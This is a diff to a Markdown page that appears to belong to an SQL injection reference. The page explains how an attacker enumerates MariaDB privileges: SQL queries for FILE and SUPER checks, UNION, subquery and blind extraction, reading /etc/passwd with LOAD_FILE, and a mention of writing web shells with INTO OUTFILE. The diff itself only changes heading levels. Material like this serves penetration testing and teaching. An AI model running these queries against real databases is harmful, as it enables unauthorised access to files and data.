@@ -7,11 +7,9 @@ tags: ["privileges", "permissions", "file access"]
 lastUpdated: 2025-12-18
 ---
 
-## Privileges
-
 Understanding MariaDB privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.
 
-### Current User Identification
+## Current User Identification
 
 MariaDB provides two functions for user identification:
 
@@ -33,7 +31,7 @@ SELECT USER() AS connection_user
 
 > **Note:** See [Database Credentials](/mariadb/database-credentials) for USER() parsing techniques.
 
-### Checking Current User Privileges
+## Checking Current User Privileges
 
 To check what privileges the current database user has:
 
@@ -94,7 +92,7 @@ WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
 LIMIT 10
 ```
 
-### Important Privileges to Check
+## Important Privileges to Check
 
 | Privilege        | Description                      | Exploitation Potential                                                      |
 | ---------------- | -------------------------------- | --------------------------------------------------------------------------- |
@@ -106,7 +104,7 @@ LIMIT 10
 | `RELOAD`         | Can reload server settings       | Can flush privileges                                                        |
 | `ALL PRIVILEGES` | All privileges (admin)           | Complete database control                                                   |
 
-### Checking for FILE Privilege
+## Checking for FILE Privilege
 
 The FILE privilege is particularly important as it allows reading from and writing to files on the server:
 
@@ -123,23 +121,23 @@ Or more generally using information_schema:
 SELECT 1 FROM information_schema.user_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'") AND privilege_type = 'FILE';
 ```
 
-### Checking for Specific Capabilities
+## Checking for Specific Capabilities
 
-#### Can you read files?
+### Can you read files?
 
 ```sql
 -- Returns 1 if you can read files
 SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
 ```
 
-#### Can you write files?
+### Can you write files?
 
 ```sql
 -- Same check as reading files (FILE privilege covers both)
 SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
 ```
 
-### Checking All Privileges at Once
+## Checking All Privileges at Once
 
 ```sql
 -- Show all privileges for current user (requires mysql.user access)
@@ -178,7 +176,7 @@ SELECT
    AND privilege_type = 'PROCESS') AS process_priv
 ```
 
-### Practical Usage
+## Practical Usage
 
 If you have the FILE privilege, you can:
 
@@ -186,7 +184,7 @@ If you have the FILE privilege, you can:
 - Write web shells using `INTO OUTFILE`
 - Access database configuration files
 
-### Example: Checking and Using FILE Privilege
+## Example: Checking and Using FILE Privilege
 
 ```sql
 -- Check if we have FILE privilege (requires mysql.user access)
@@ -212,7 +210,7 @@ SELECT LOAD_FILE('/etc/passwd')
 SELECT 'test content' INTO OUTFILE '/tmp/test.txt'
 ```
 
-### Boolean-Based Privilege Detection
+## Boolean-Based Privilege Detection
 
 Using EXISTS for privilege checks in blind injection scenarios:
 
@@ -235,9 +233,9 @@ SELECT IF(
 -- Returns: 1 if user has SUPER privilege, 0 otherwise
 ```
 
-### Privilege Enumeration in Injection Context
+## Privilege Enumeration in Injection Context
 
-#### UNION-Based Extraction
+### UNION-Based Extraction
 
 ```sql
 -- Extract privileges via UNION injection
@@ -259,7 +257,7 @@ WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
 LIMIT 5
 ```
 
-#### Subquery-Based Extraction
+### Subquery-Based Extraction
 
 ```sql
 -- Extract privilege info as subquery
@@ -267,7 +265,7 @@ SELECT (SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privile
         WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")) AS privs
 ```
 
-### MariaDB-Specific Notes
+## MariaDB-Specific Notes
 
 MariaDB's default `secure_file_priv` setting may be less restrictive than MySQL. Check the current setting:
 
@@ -285,7 +283,7 @@ An empty value means file operations are allowed anywhere the MariaDB user has f
 
 > **Verification Note:** Some MariaDB versions display different values between `SHOW VARIABLES LIKE 'secure_file_priv'` and `SELECT @@secure_file_priv`. Use both methods to verify the actual setting. Behavior varies by MariaDB version and distribution.
 
-### Privilege Levels in MariaDB
+## Privilege Levels in MariaDB
 
 Privileges are granted at different levels:
 
@@ -297,7 +295,7 @@ Privileges are granted at different levels:
 | Column   | `mysql.columns_priv` | Applies to specific column         |
 | Routine  | `mysql.procs_priv`   | Applies to stored procedures/funcs |
 
-### Note
+## Note
 
 The actual privileges available to you depend on:
 
